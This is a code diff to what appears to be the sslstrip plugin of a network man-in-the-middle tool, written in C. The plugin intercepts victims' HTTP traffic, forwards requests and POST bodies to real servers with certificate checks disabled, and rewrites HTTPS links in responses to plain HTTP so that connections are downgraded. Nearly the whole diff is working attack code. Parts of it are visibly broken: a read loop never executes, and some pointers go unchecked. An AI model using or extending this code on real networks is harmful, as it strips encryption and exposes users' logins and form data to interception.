@@ -61,6 +61,9 @@
 #define PROTO_HTTP 1
 #define PROTO_HTTPS 2
 
+#define HTTP_GET (1<<16)
+#define HTTP_POST (1<<24)
+
 #define HTTP_MAX (1024*20) //20KB max for HTTP requests.
 
 #define BREAK_ON_ERROR(x,y,z) do {  \
@@ -97,19 +100,33 @@ struct https_link {
 	LIST_ENTRY (https_link) next;	
 };
 
+struct http_request {
+	int method;
+	struct curl_slist *headers;
+	char *url;
+	char *payload;
+};
+
+struct http_response {
+	int http_code;
+	struct curl_slist *headers;
+	char *html;
+	size_t len;
+};
+
 struct http_connection {
 	int fd; 
 	u_int16 port[2];
 	struct ip_addr ip[2];
-	char *url;
 	#define HTTP_CLIENT 0
 	#define HTTP_SERVER 2
 	CURL *handle; 
-	char *buffer;
-	size_t len;
+	struct http_request request;
+	struct http_response response;
 	char curl_err_buffer[CURL_ERROR_SIZE];
 	LIST_HEAD(, https_link) links;
 };
+
 
 /* globals */
 static int main_fd;
@@ -117,6 +134,7 @@ static u_int16 bind_port;
 static struct pollfd poll_fd;
 
 static regex_t *find_https_re = NULL;
+
 
 /* protos */
 int plugin_load(void *);
@@ -135,7 +153,7 @@ static size_t http_create_ident(void **i, struct packet_object *po);
 static int http_sync_conn(struct http_connection *connection);
 static int http_get_peer(struct http_connection *connection);
 static int http_read(struct http_connection *connection, struct packet_object *po);
-static int http_write(struct http_connection *connection);
+static int http_write(int fd, char *ptr, size_t total_len);
 static int http_insert_redirect(u_int16 dport);
 static int http_remove_redirect(u_int16 port);
 static void http_initialize_po(struct packet_object *po, u_char *p_data, size_t len);
@@ -146,6 +164,10 @@ static void http_send(struct http_connection *connection, struct packet_object *
 static void http_remove_https(struct http_connection *connection);
 static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata);
 static size_t http_write_to_server(void *ptr, size_t size, size_t nmemb, void *stream);
+
+
+/* functions to connect to real HTTP server */
+static int http_connect_real_server(struct http_connection *connection, struct packet_object *po);
 
 
 /* thread stuff */
@@ -178,12 +200,9 @@ static int sslstrip_init(void *dummy)
 		return PLUGIN_FINISHED;
 	}
 	
-	/* start HTTP accept thread */
-
-	/* add hook point in the dissector for HTTP traffic */
-	//hook_add(HOOK_PROTO_HTTP, &sslstrip);
-
 	hook_add(HOOK_HANDLED, &sslstrip);
+
+	/* start HTTP accept thread */
 
 
 	ec_thread_new_detached("http_accept_thread", "HTTP Accept thread", &http_accept_thread, NULL, 1);
@@ -219,6 +238,9 @@ static int sslstrip_is_http(struct packet_object *po)
 	    ntohs(po->L4.src) == 80)
 		return 1;
 
+	if (strstr(po->DATA.data, "HTTP/1.1") ||
+	    strstr(po->DATA.data, "HTTP/1.0"))
+		return 1;
 	return 0;
 }
 
@@ -470,7 +492,7 @@ static EC_THREAD_FUNC(http_accept_thread)
 			ip_addr_init(&connection->ip[HTTP_CLIENT], AF_INET, (char *)&(client_sin.sin_addr.s_addr));
 			connection->port[HTTP_CLIENT] = client_sin.sin_port;
 			connection->port[HTTP_SERVER] = htons(80);
-			connection->len = 0;
+			//connection->request.len = 0;
 
 			/* create detached thread */
 			ec_thread_new_detached("http_child_thread", "http child", &http_child_thread, connection, 1);	
@@ -527,7 +549,7 @@ static int http_get_peer(struct http_connection *connection)
 	 ip_addr_init(&connection->ip[HTTP_SERVER], AF_INET, (u_char *)&sa_in.sin_addr);
 #endif
 
-	DEBUG_MSG("SSLStrip: Got peer!");
+	DEBUG_MSG("SSLStrip: Got peer!\n");
 	
 	return ESUCCESS;
 
@@ -567,7 +589,6 @@ static int http_read(struct http_connection *connection, struct packet_object *p
 
 	len = read(connection->fd, po->DATA.data, HTTP_MAX);
 
-	DEBUG_MSG("SSLStrip: Read request %s", po->DATA.data);
 
 	po->DATA.len = len;
 	return len;	
@@ -578,19 +599,73 @@ static void http_handle_request(struct http_connection *connection, struct packe
 	struct https_link *link;
 	char sent = 0;
 
-	SAFE_CALLOC(connection->url, 1, 1024);
+	SAFE_CALLOC(connection->request.url, 1, 1024);
 
-	if (connection->url==NULL)
+	if (connection->request.url==NULL)
 		return;
 
-	memset(connection->url, '\0', 1024);
+	memset(connection->request.url, '\0', 1024);
 
-	Find_Url(po->DATA.data, &connection->url);
-	
-	DEBUG_MSG("SSLStrip: Found URL %s", connection->url);
+	Find_Url(po->DATA.data, &connection->request.url);
+
+	if (connection->request.url == NULL) {
+		//Means we received a request for a HTTP method other than GET or POST
+		//Open socket to server and send raw response?
+		if (http_connect_real_server(connection, po) == ESUCCESS) {
+			DEBUG_MSG("SSLStrip: Sent request straight to real server");
+		}	
+
+		return;
+	}
+
+
+	//parse HTTP request
+	struct http_request request = connection->request;
+
+	if (strstr(po->DATA.data, "GET")) {
+		request.method = HTTP_GET;
+	} else if (strstr(po->DATA.data, "POST")) {
+		request.method = HTTP_POST;
+	}
+
+	char *r = po->DATA.data;
+
+	//Skip the first line of request
+	r = strstr(po->DATA.data, "\r\n");
+	r += 2; //Skip \r\n
+
+	char *h = strdup(r);
+	char *body = strdup(r);
+	BUG_IF(h==NULL);
+	BUG_IF(body==NULL);
+
+	char *end_header = strstr(h, "\r\n\r\n");
+	*end_header = '\0';
+
+	char *header;
+	char *saveptr;
+	header = ec_strtok(h, "\r\n", &saveptr);
+
+	while(header) {
+		request.headers = curl_slist_append(request.headers, header);
+		header = ec_strtok(NULL, "\r\n", &saveptr);
+	}
+
+	SAFE_FREE(h);
+
+	char *b = strstr(body, "\r\n\r\n");
+
+	if (b != NULL) {
+		b += 4;
+		request.payload = strdup(b);
+		BUG_IF(request.payload == NULL);
+	}
+
+	SAFE_FREE(body);
+
 
 	LIST_FOREACH(link, &connection->links, next) {
-		if (!strcmp(link->url, connection->url)) {
+		if (!strcmp(link->url, connection->request.url)) {
 			DEBUG_MSG("SSLStrip: Sending HTTPS request");
 			http_send(connection, po, PROTO_HTTPS);
 			sent =1;
@@ -608,25 +683,28 @@ static void http_send(struct http_connection *connection, struct packet_object *
 {
 	connection->handle = curl_easy_init();
 	char *url;
+	struct http_request request = connection->request;
 
 	//Allow decoders to run for request
 	if (proto == PROTO_HTTPS) {
 		curl_easy_setopt(connection->handle, CURLOPT_SSL_VERIFYPEER, 0L);
 		curl_easy_setopt(connection->handle, CURLOPT_SSL_VERIFYHOST, 0L);
 
-		url = (char *)malloc(strlen(connection->url)+strlen("https://"));
-		snprintf(url, strlen(connection->url)+strlen("https://"), "https://%s", connection->url);
+		url = (char *)malloc(strlen(connection->request.url)+strlen("https://"));
+		snprintf(url, strlen(connection->request.url)+strlen("https://")+1, "https://%s", connection->request.url);
 	} else {
-		url = (char *)malloc(strlen(connection->url)+strlen("http://"));
-		snprintf(url, strlen(connection->url)+strlen("http://"), "http://%s", connection->url);
+		url = (char *)malloc(strlen(connection->request.url)+strlen("http://"));
+		snprintf(url, strlen(connection->request.url)+strlen("http://")+1, "http://%s", connection->request.url);
 	}
 
 
 	if (url==NULL) {
-		USER_MSG("Not enough memory to allocate for URL %s", connection->url);
+		USER_MSG("Not enough memory to allocate for URL %s\n", connection->request.url);
 		return;
 	}	
 
+
+	curl_easy_setopt(connection->handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
 	curl_easy_setopt(connection->handle, CURLOPT_URL, url);
 	curl_easy_setopt(connection->handle, CURLOPT_WRITEFUNCTION, http_receive_from_server);
 	curl_easy_setopt(connection->handle, CURLOPT_WRITEDATA, connection);
@@ -634,10 +712,19 @@ static void http_send(struct http_connection *connection, struct packet_object *
 	curl_easy_setopt(connection->handle, CURLOPT_READFUNCTION, http_write_to_server);
 	curl_easy_setopt(connection->handle, CURLOPT_READDATA, po->DATA.data);
 	curl_easy_setopt(connection->handle, CURLOPT_INFILESIZE_LARGE, (curl_off_t)po->DATA.len);
-	
+	curl_easy_setopt(connection->handle, CURLOPT_HEADER, 1L);
+	curl_easy_setopt(connection->handle, CURLOPT_HTTPHEADER, request.headers);
+	//curl_easy_setopt(connection->handle, CURLOPT_WRITEHEADER, connection);
+
+
+	if(request.method == HTTP_POST) {
+		curl_easy_setopt(connection->handle, CURLOPT_POST, 1L);
+		curl_easy_setopt(connection->handle, CURLOPT_POSTFIELDS, request.payload);
+		curl_easy_setopt(connection->handle, CURLOPT_POSTFIELDSIZE, strlen(request.payload));
+	}	
 
 	if(curl_easy_perform(connection->handle) != CURLE_OK) {
-		USER_MSG("Unable to send request to HTTP server: %s", connection->curl_err_buffer);
+		USER_MSG("Unable to send request to HTTP server: %s\n", connection->curl_err_buffer);
 		return;
 	} else {
 		DEBUG_MSG("SSLStrip: Sent request to server");
@@ -648,28 +735,46 @@ static void http_send(struct http_connection *connection, struct packet_object *
 	http_remove_https(connection);
 
 	//Send result back to client
-	if (http_write(connection) != ESUCCESS){
-		USER_MSG("Unable to send HTTP response back to client");
+	//TODO: Figure out what is happening
+	if (http_write(connection->fd, connection->response.html, connection->response.len) != ESUCCESS){
+		USER_MSG("Unable to send HTTP response back to client\n");
 	} else {
 		DEBUG_MSG("Sent HTTP response back to client");
 	}
 
 
 	//Allow decoders to run on HTTP response
-	http_initialize_po(po, connection->buffer, connection->len);
+	
+	packet_destroy_object(po);
+	http_initialize_po(po, connection->response.html, connection->response.len);
+
+   	po->len = po->DATA.len;
+   	po->L4.flags |= TH_PSH;
+
+	packet_disp_data(po, po->DATA.data, po->DATA.len);
 	http_parse_packet(connection, HTTP_SERVER, po);
 
+	//Free up request
+
+	if (request.headers)
+		curl_slist_free_all(request.headers);
+	
+
+	if (request.method == HTTP_POST) {
+		SAFE_FREE(request.payload);
+	}
+
+	SAFE_FREE(request.url);
 	SAFE_FREE(url);
 }
 
-static int http_write(struct http_connection *connection)
+static int http_write(int fd, char *ptr, size_t total_len)
 {
 	int len, err;
 	int bytes_sent= 0;
-	char *ptr = connection->buffer;
 
-	while (bytes_sent < connection->len) {
-		len = write(connection->fd, ptr, connection->len);
+	while (bytes_sent < total_len) {
+		len = write(fd, ptr, total_len);
 
 		if (len <= 0) {
 			err = GET_SOCK_ERRNO();
@@ -679,7 +784,7 @@ static int http_write(struct http_connection *connection)
 	
 		bytes_sent += len;
 	
-		if (bytes_sent < connection->len)
+		if (bytes_sent < total_len)
 			ptr += bytes_sent;
 	}
 
@@ -692,35 +797,33 @@ static size_t http_write_to_server(void *ptr, size_t size, size_t nmemb, void *s
 	return size*nmemb;
 }
 
+
 static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata)
 {
 	struct http_connection *connection = (struct http_connection *)userdata;
 
-	DEBUG_MSG("SSLStrip: Received response from server %s", ptr);
 
-	if (connection->len == 0) {
+	if (connection->response.len == 0) {
 		//Initiailize buffer
-		SAFE_CALLOC(connection->buffer, 1, size*nmemb);
-		if (connection->buffer == NULL)
+		SAFE_CALLOC(connection->response.html, 1, size*nmemb);
+		if (connection->response.html == NULL)
 			return 0;
 
-		memcpy(connection->buffer, ptr, size*nmemb);
+		memcpy(connection->response.html, ptr, size*nmemb);
 	} else {
 		//char *b = realloc(connection->buffer, connection->len+(size*nmemb));
 		char *b;
 
-		SAFE_CALLOC(b, 1, connection->len+(size*nmemb));
+		SAFE_CALLOC(b, 1, connection->response.len+(size*nmemb));
 		BUG_IF(b == NULL);
 	
-		memcpy(b, connection->buffer, connection->len);	
-		memcpy(b+connection->len, ptr, size*nmemb);
-		connection->buffer = b;
-		DEBUG_MSG("SSLStrip: Buffer contains %s", connection->buffer);
+		memcpy(b, connection->response.html, connection->response.len);	
+		memcpy(b+connection->response.len, ptr, size*nmemb);
+		connection->response.html = b;
 	}
 
-	connection->len += size*nmemb;
+	connection->response.len += size*nmemb;
 
-	DEBUG_MSG("SSLStrip: Connection buffer len now is %ld", connection->len);
 
 	return size*nmemb;
 }
@@ -855,7 +958,7 @@ static void http_remove_https(struct http_connection *connection)
 static void http_remove_https(struct http_connection *connection)
 {
 	regmatch_t match[5];
-	char *buf_cpy = strndup(connection->buffer, connection->len);
+	char *buf_cpy = strndup(connection->response.html, connection->response.len);
 	char *scroll = buf_cpy;
 
 	char http[] = " http";
@@ -898,7 +1001,7 @@ static void http_remove_https(struct http_connection *connection)
 			LIST_INSERT_HEAD(&connection->links, l, next);
 		}
 
-		memcpy(connection->buffer +((buf_cpy+match[2].rm_so)-scroll), http, https_len);
+		memcpy(connection->response.html +((buf_cpy+match[2].rm_so)-scroll), http, https_len);
 		buf_cpy += match[3].rm_eo;
 	}
 
@@ -1018,11 +1121,84 @@ static void http_wipe_connection(struct http_connection *connection)
 	close_socket(connection->fd);
 	curl_easy_cleanup(connection->handle);
 
-	if(connection->buffer)
-		SAFE_FREE(connection->buffer);
+	if(connection->response.html)
+		SAFE_FREE(connection->response.html);
 
 	if (connection)
 		SAFE_FREE(connection);
+}
+
+static int http_connect_real_server(struct http_connection *connection, struct packet_object *po) {
+	int fd;
+
+	char *dest_ip = strdup(int_ntoa(ip_addr_to_int32(connection->ip[HTTP_SERVER].addr)));
+	if (!dest_ip)
+		return -EINVALID;
+
+	if((fd = open_socket(dest_ip, 80)) < 0) {
+		USER_MSG("SSLStrip: Could not connect to HTTP server\n");
+		return -EINVALID;
+	}
+
+	set_blocking(fd, 0);
+
+
+	if (http_write(fd, po->DATA.data, po->DATA.len) == -EINVALID) {
+		USER_MSG("SSLStrip: Could not send request to HTTP server\n");
+		close_socket(fd);
+		return -EINVALID;
+	}
+			
+
+	//Read response and send back to client
+	char *response;
+	SAFE_CALLOC(response, 1, HTTP_MAX);
+
+	BUG_IF(response == NULL);
+
+	int len = 0;
+
+	http_initialize_po(po, NULL, 0); //Reset po
+
+/*
+                SAFE_CALLOC(b, 1, connection->response.len+(size*nmemb));
+                BUG_IF(b == NULL);
+
+                memcpy(b, connection->response.html, connection->response.len);
+                memcpy(b+connection->response.len, ptr, size*nmemb);
+                connection->response.html = b;
+
+*/
+	while(len>0) {
+		len = read(fd, response, HTTP_MAX);
+		char *b;
+		SAFE_CALLOC(b, 1, po->DATA.len+len);
+		BUG_IF(b==NULL);
+
+		memcpy(b, po->DATA.data, po->DATA.len);
+		memcpy(b+po->DATA.len, response, len);
+		po->DATA.len += len;
+		http_initialize_po(po, response, len);
+	}
+
+	DEBUG_MSG("SSLStrip: Connect real server response: %s", po->DATA.data);
+	http_parse_packet(connection, HTTP_SERVER, po);
+
+	if (http_write(connection->fd, po->DATA.data, po->DATA.len) == -EINVALID) {
+		USER_MSG("SSLStrip: Could not send HTTP response back to client\n");
+		SAFE_FREE(response);
+		http_initialize_po(po, NULL, 0);
+		close_socket(fd);
+		return -EINVALID;
+	}
+	
+
+	SAFE_FREE(response);
+	http_initialize_po(po, NULL, 0);
+
+	close_socket(fd);	
+
+	return ESUCCESS;
 }
 
 #endif /* HAVE_LIBCURL */
